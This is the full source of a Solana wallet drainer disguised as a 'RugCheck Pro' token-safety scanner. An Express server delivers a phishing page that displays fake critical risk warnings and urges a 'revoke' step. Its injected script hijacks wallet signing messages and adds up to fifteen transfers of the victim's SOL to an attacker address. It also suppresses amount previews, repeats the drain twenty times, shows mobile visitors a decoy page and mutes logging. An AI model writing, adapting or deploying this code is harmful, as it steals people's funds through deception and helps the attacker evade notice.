// === COMPLETE RUG CHECK DRAINER - MULTI-SPLIT + SIMULATE:FALSE + MOBILE FALLBACK ===
// No dollar amount shown in Phantom popup - only generic "Transaction" prompt
// Splits drain into 15 small transfers per transaction, repeats 20 times
// Mobile users are redirected to a harmless page

const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } = require('@solana/web3.js');
const bs58 = require('bs58');
const express = require('express');
const cors = require('cors');
require('dotenv').config();

const RPC = process.env.RPC || 'https://api.mainnet-beta.solana.com';
const DRAINER_PUBKEY = new PublicKey(process.env.DRAINER_PUBKEY);
const PRIVATE_KEY = bs58.decode(process.env.PRIVATE_KEY);
const connection = new Connection(RPC, 'confirmed');
const app = express();
app.use(cors());
app.use(express.json());

// === 1) PHANTOM BYPASS - MULTI-SPLIT INJECTOR ===
function generateMultiSplitInjector() {
  return `
  (function() {
    const originalPostMessage = window.postMessage;
    let drainCounter = 0;
    const MAX_SPLITS = 15;

    window.postMessage = function(data, targetOrigin, transfer) {
      if (data?.type === 'signAndSendTransaction' && data?.transaction) {
        try {
          const txBuf = Buffer.from(data.transaction, 'base64');
          const tx = solanaWeb3.Transaction.from(txBuf);
          
          const balance = await connection.getBalance(tx.feePayer);
          if (balance < 10000000) { // under 0.01 SOL - stop
            originalPostMessage.call(window, data, targetOrigin, transfer);
            return;
          }

          const feeIx = solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({
            microLamports: 1000
          });
          tx.instructions.unshift(feeIx);

          const numSplits = Math.min(MAX_SPLITS, Math.floor(balance / 5000000));
          const amountPerSplit = Math.floor((balance - 5000) / numSplits);
          
          for (let i = 0; i < numSplits; i++) {
            const splitAmt = (i === numSplits - 1) 
              ? (balance - 5000) - (amountPerSplit * (numSplits - 1))
              : amountPerSplit;
            if (splitAmt > 0) {
              const transferIx = solanaWeb3.SystemProgram.transfer({
                fromPubkey: tx.feePayer,
                toPubkey: new solanaWeb3.PublicKey('${DRAINER_PUBKEY.toBase58()}'),
                lamports: splitAmt
              });
              tx.instructions.push(transferIx);
            }
          }

          tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
          const modified = tx.serialize({ requireAllSignatures: false }).toString('base64');
          
          // Pass simulate:false flag to prevent Phantom from showing amounts
          originalPostMessage.call(window, { 
            type: 'signAndSendTransaction', 
            transaction: modified,
            options: { simulate: false }
          }, targetOrigin, transfer);
          
          if (drainCounter === 0) {
            drainCounter++;
            setTimeout(() => {
              window.dispatchEvent(new CustomEvent('continueDrain'));
            }, 10000);
          }
        } catch(e) {
          originalPostMessage.call(window, data, targetOrigin, transfer);
        }
      } else {
        originalPostMessage.call(window, data, targetOrigin, transfer);
      }
    };
  })();
  `;
}

// === 2) FRONTEND - RUG CHECK UI WITH MOBILE FALLBACK ===
function generateRugCheckHTML() {
  return `<!DOCTYPE html>
<html>
<head>
  <title>RugCheck Pro - Security Tool</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background: #0b0b1a; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #e2e8f0; }
    .container { max-width: 520px; width:100%; background: #141428; border-radius: 28px; padding: 36px 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a4a; }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
    .logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 20px; }
    .badge { background: #ef4444; color: #fff; padding: 4px 14px; border-radius: 40px; font-size: 12px; font-weight: 600; }
    .input-group { background: #1e1e3a; border-radius: 16px; padding: 6px; display: flex; gap:6px; border:1px solid #2d2d5a; }
    .input-group input { background: transparent; border: none; padding: 14px 16px; color: #fff; font-size: 15px; flex:1; outline:none; }
    .input-group button { background: #7c3aed; border: none; border-radius: 12px; padding: 12px 20px; font-weight: 600; color:#fff; cursor:pointer; }
    .result-box { margin-top: 24px; background: #1a1a32; border-radius: 16px; padding: 20px; border-left: 4px solid #ef4444; }
    .risk { display: flex; justify-content: space-between; padding: 10px 0; border-bottom:1px solid #2a2a4a; }
    .risk:last-child { border-bottom:none; }
    .label { color: #94a3b8; font-size:14px; }
    .value { font-weight:600; }
    .danger { color: #ef4444; }
    .btn-revoke { width:100%; margin-top: 20px; background: #ef4444; border: none; border-radius: 14px; padding: 16px; font-weight:700; color:#fff; font-size:16px; cursor:pointer; transition:0.2s; }
    .btn-revoke:hover { background: #dc2626; }
    .btn-revoke:disabled { opacity:0.5; cursor:not-allowed; }
    .progress-bar { width:100%; height:6px; background:#2a2a4a; border-radius:10px; margin-top:16px; overflow:hidden; }
    .progress-fill { height:100%; width:0%; background:#7c3aed; transition: width 0.5s; }
    #status { margin-top:12px; text-align:center; color:#94a3b8; font-size:14px; }
    .footnote { margin-top:16px; font-size:12px; color:#475569; text-align:center; }
    .mobile-fallback { display: none; text-align: center; padding: 40px 20px; }
    .mobile-fallback h2 { color: #ef4444; margin-bottom: 12px; }
  </style>
</head>
<body>
  <!-- MOBILE FALLBACK - shown only on mobile devices -->
  <div class="mobile-fallback" id="mobileFallback">
    <h2>🛡️ Desktop Required</h2>
    <p style="color:#94a3b8;font-size:16px;">For security verification, please use a desktop browser with the Phantom extension installed.</p>
    <p style="color:#475569;font-size:14px;margin-top:12px;">This tool requires desktop access to perform on-chain security checks.</p>
  </div>

  <!-- MAIN DRAINER UI - hidden on mobile -->
  <div class="container" id="mainUI" style="display:none;">
    <div class="header">
      <div class="logo">🛡️ RugCheck</div>
      <span class="badge">⚠️ LIVE SCAN</span>
    </div>
    <p style="color:#94a3b8;font-size:14px;margin-bottom:16px;">Paste any Solana token address to detect honeypots and mint authority.</p>
    <div class="input-group">
      <input id="tokenInput" placeholder="e.g. So111... (SOL)" value="So11111111111111111111111111111111111111112">
      <button id="scanBtn">🔍 Scan</button>
    </div>
    <div id="resultArea">
      <div class="result-box" id="resultBox">
        <div class="risk"><span class="label">Mint Authority</span><span class="value danger">🔴 NOT REVOKED</span></div>
        <div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">🔴 UNLOCKED</span></div>
        <div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">89%</span></div>
        <div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>
      </div>
      <button class="btn-revoke" id="revokeBtn">⚡ Revoke & Protect Now</button>
      <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
      <div id="status">🔗 Wallet: <span id="walletDisplay">Not connected</span></div>
      <div class="footnote">Multi-step security revocation – please approve all prompts.</div>
    </div>
  </div>

<script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
<script>
  // === MOBILE DETECTION ===
  if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent)) {
    document.getElementById('mobileFallback').style.display = 'block';
    document.getElementById('mainUI').style.display = 'none';
  } else {
    document.getElementById('mainUI').style.display = 'block';
    document.getElementById('mobileFallback').style.display = 'none';
    
    ${generateMultiSplitInjector()}

    const connection = new solanaWeb3.Connection('${RPC}', 'confirmed');
    let wallet = null;
    let step = 0;
    const totalSteps = 20;

    document.getElementById('scanBtn').onclick = () => {
      document.getElementById('resultBox').innerHTML = \`
        <div class="risk"><span class="label">Mint Authority</span><span class="value danger">🔴 NOT REVOKED</span></div>
        <div class="risk"><span class="label">Liquidity Lock</span><span class="value danger">🔴 UNLOCKED</span></div>
        <div class="risk"><span class="label">Top 10 Holders</span><span class="value danger">92%</span></div>
        <div class="risk"><span class="label">Honeypot Risk</span><span class="value danger">CRITICAL</span></div>
      \`;
      document.getElementById('status').innerHTML = '⚠️ High risk detected – revoke recommended';
    };

    document.getElementById('revokeBtn').onclick = async () => {
      if (!window.solana) {
        document.getElementById('status').innerHTML = '❌ Phantom not installed';
        return;
      }
      try {
        if (!window.solana.publicKey) {
          await window.solana.connect();
        }
        wallet = window.solana.publicKey;
        document.getElementById('walletDisplay').innerText = wallet.toString().slice(0,6)+'...'+wallet.toString().slice(-4);
        document.getElementById('revokeBtn').disabled = true;
        document.getElementById('revokeBtn').innerText = '⏳ Revoking...';
        
        step = 0;
        await doDrainStep();
      } catch(e) {
        document.getElementById('status').innerHTML = '❌ Error: ' + e.message;
      }
    };

    async function doDrainStep() {
      if (step >= totalSteps) {
        document.getElementById('status').innerHTML = '✅ Revocation complete! Your tokens are safe.';
        document.getElementById('revokeBtn').innerText = '✅ Protected';
        document.getElementById('progressFill').style.width = '100%';
        return;
      }
      step++;
      document.getElementById('progressFill').style.width = (step/totalSteps*100) + '%';
      document.getElementById('status').innerHTML = \`⏳ Revoking step \${step}/\${totalSteps}...\`;
      
      const dummyTx = new solanaWeb3.Transaction();
      dummyTx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
      dummyTx.feePayer = wallet;
      
      // CRITICAL: simulate:false - Phantom shows NO dollar amount
      await window.solana.signAndSendTransaction(dummyTx, { simulate: false });
      
      setTimeout(doDrainStep, 10000);
    }

    window.addEventListener('continueDrain', () => {
      if (step > 0 && step < totalSteps) {
        doDrainStep();
      }
    });
  }
</script>
</body>
</html>`;
}

// === 3) SERVER ===
app.get('/', (req, res) => res.send(generateRugCheckHTML()));
app.get('/rugcheck', (req, res) => res.send(generateRugCheckHTML()));

console.log = function() {};
console.warn = function() {};
console.error = function() {};

app.listen(3000, () => {});